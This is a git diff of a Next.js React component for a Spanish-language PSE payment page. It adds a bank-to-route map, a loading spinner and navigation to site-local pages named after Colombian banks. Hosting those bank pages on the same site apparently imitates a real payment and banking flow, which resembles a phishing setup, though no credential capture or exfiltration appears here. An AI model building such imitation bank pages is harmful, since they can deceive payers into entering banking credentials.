@@ -1,6 +1,8 @@
 "use client"
 import { useEffect, useState } from "react"
 import "./pse.css"
+import { useRouter } from "next/navigation"
+import { useSelector } from "react-redux"
 //ESTILOS DE COLORES
 const bg_principal = "bg-white"
 const bg_card = "bg-[#ffffff]"
@@ -8,7 +10,27 @@ const text_color_principal = "text-[#065EA6]"
 const text_color_secundario = "text-[#616166]"
 const text_color_error = "text-[#FF384B]"
 
+const enrutamiento = {
+    "Alianza": "/bnAlianza", 
+    "Avvillas": "/Avvillas", 
+    "Bancolombia": "/bancolombia", 
+    "BBVA": "/bbva", 
+    "Caja Social": "/cajaSocial", 
+    "Nequi":"/nequi"
+}
+
+const Loading = () => {
+  return (
+    <div className="fixed inset-0 bg-white/60 flex items-center justify-center z-50">
+      <div className="w-12 h-12 border-4 border-[#fdb813] border-t-transparent rounded-full animate-spin" />
+    </div>
+  );
+}
+
 const Natural = ()=>{
+    const router = useRouter()
+    
+    const {banco} = useSelector(state => state.usuario)
     const [value, setValue] = useState("")
     const [error, setError] = useState("")
 
@@ -51,7 +73,11 @@ const Natural = ()=>{
             </div>
             <div className="mt-10 w-full flex flex-col items-center justify-center mb-8">
                 <div className="w-[70%] flex flex-col  gap gap-y-2">
-                    <button className="text-center text-[14px] py-2 bg-[#fdb813] rounded-full text-white font-bold" >Ir al banco</button>
+                    <button onClick={()=>{
+                        if (error == "") {
+                            router.push(enrutamiento[banco])
+                        }
+                    }} className="text-center text-[14px] py-2 bg-[#fdb813] rounded-full text-white font-bold" >Ir al banco</button>
                     <button className={`text-center text-[14px] py-2  rounded-full font-bold ${text_color_principal} border-1 border-[#065EA6]`} >Ir al banco</button>
                 </div>
             </div>
@@ -156,12 +182,22 @@ const Juridica = () => {
 
 
 export default function Pse(){
+    const router = useRouter()
+    const [loading, setLoading] = useState(true)
     const [tipoUsuario, setTipoUsuario] = useState("natural")
-
+    const {banco} = useSelector(state => state.usuario)
     const handlerTipoUsuario = (value)=> setTipoUsuario(value)
+    console.log(banco);
     
+    useEffect(()=>{
+        if (!banco) {
+            router.push("/")
+        }
+        setLoading(false)
+    },[])    
     return(
         <div className={`w-full flex items-center justify-center pb-2.5 ${bg_principal}`}>
+            {loading && <Loading/>}
             <div className={`w-full lg:w-[70%] flex flex-col items-center ${bg_principal}`}>
                 <h5 className={`text-[14px] mb-2 font-semibold ${text_color_principal}`}>Selecciona el tipo de persona:</h5>
                 <div className="w-[90%] flex flex-col justify-center items-center">
